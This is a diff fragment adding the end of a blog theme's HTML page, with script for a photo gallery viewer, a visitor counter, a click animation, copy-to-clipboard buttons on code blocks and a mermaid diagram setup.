+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
